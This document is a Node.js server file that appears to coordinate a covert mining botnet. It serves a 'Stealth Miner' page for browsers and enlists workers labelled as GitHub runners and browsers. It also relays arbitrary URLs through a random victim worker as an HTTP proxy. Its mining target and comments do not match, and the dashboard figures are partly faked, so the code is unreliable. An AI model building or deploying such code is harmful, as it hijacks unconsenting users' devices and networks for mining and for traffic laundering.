const express = require('express');
const { Server } = require('ws');
const http = require('http');
const cors = require('cors');
const path = require('path');

// --- CONFIGURATION ---
const PORT = process.env.PORT || 3000;

// --- MINING STATE (The "Brain") ---
let searchRange = 0;
const RANGE_SIZE = 100000; // Each worker checks 100k numbers per job
let foundGoldenTicket = null;
let workers = new Set();    // Set of active WebSocket connections (GitHub/Browsers)
let clients = new Set();    // Set of active Dashboards (You)
let totalHashes = 0;        // Global counter of work done

const app = express();
app.use(cors());
const server = http.createServer(app);
const wss = new Server({ server });

// --- HTTP ROUTES ---
// 1. The SysAdmin Dashboard
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// 2. The Stealth Miner (for browsers)
app.get('/join', (req, res) => {
    res.sendFile(path.join(__dirname, 'miner.html'));
});

// --- WEBSOCKET LOGIC ---
wss.on('connection', (ws) => {

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            handleMessage(ws, data);
        } catch (e) {
            console.error('Invalid JSON:', e.message);
        }
    });

    ws.on('close', () => {
        workers.delete(ws);
        clients.delete(ws);
        // We don't log every disconnect to keep logs clean
        broadcastStats();
    });
});

// --- CORE SYSTEM LOGIC ---
function handleMessage(ws, data) {
    switch (data.type) {

        // A Worker (GitHub or Browser) reports for duty
        case 'REGISTER_WORKER':
            workers.add(ws);
            console.log('New Worker Joined! Assigning task...');
            sendJob(ws); // Give them work immediately
            broadcastStats();
            break;

        // The Dashboard connects to watch
        case 'REGISTER_CLIENT':
            clients.add(ws);
            broadcastStats();
            break;

        // A Worker finished a range
        case 'JOB_COMPLETE':
            // 1. Record the work done
            totalHashes += RANGE_SIZE;

            // 2. Did they find the Golden Ticket?
            if (data.solution) {
                foundGoldenTicket = data.solution;
                console.log("!!! GOLDEN TICKET FOUND: " + data.solution);
                broadcastStats(); // Tell everyone the good news
            }

            // 3. Give them the next chunk of work (if we haven't stopped)
            if (!foundGoldenTicket) {
                sendJob(ws);
            }
            broadcastStats();
            break;

        // 4. Client wants to proxy a request
        case 'SEND_PROXY_CMD':
            // Pick a random worker
            const workerArray = Array.from(workers);
            if (workerArray.length > 0) {
                const randomWorker = workerArray[Math.floor(Math.random() * workerArray.length)];

                randomWorker.send(JSON.stringify({
                    type: 'HTTP_PROXY',
                    url: data.url,
                    requestId: Date.now()
                }));
                console.log(`Routed proxy request for ${data.url}`);
            }
            break;

        // 5. Worker returns the proxy result
        case 'PROXY_RESULT':
             // Forward result to ALL dashboards (simple broadcast)
             clients.forEach(c => c.send(JSON.stringify({
                 type: 'PROXY_LOG',
                 data: data
             })));
             break;
    }
}

function sendJob(ws) {
    // If we already found the ticket, tell workers to stop/relax
    if (foundGoldenTicket) {
        ws.send(JSON.stringify({ type: 'STOP', solution: foundGoldenTicket }));
        return;
    }

    // Assign the next range
    const start = searchRange;
    const end = searchRange + RANGE_SIZE;
    searchRange += RANGE_SIZE; // Move the global pointer forward

    ws.send(JSON.stringify({
        type: 'MINING_JOB',
        start: start,
        end: end,
        target: '81dc9bdb52d04dc20036dbd8313ed055' // The difficulty (Hash must start with 5 zeros)
    }));
}

function broadcastStats() {
    // Send data to all connected Dashboards
    const stats = JSON.stringify({
        type: 'STATS',
        workers: workers.size,
        totalHashes: totalHashes,       // This will make the number climb
        tasksLeft: foundGoldenTicket ? 0 : 9999, // Just for the progress bar visual
        goldenTicket: foundGoldenTicket
    });

    clients.forEach(client => {
        if (client.readyState === 1) { // Ensure connection is open
            client.send(stats);
        }
    });
}

// --- START ENGINE ---
server.listen(PORT, () => {
    console.log(`Mining Brain Online on port ${PORT}`);
});
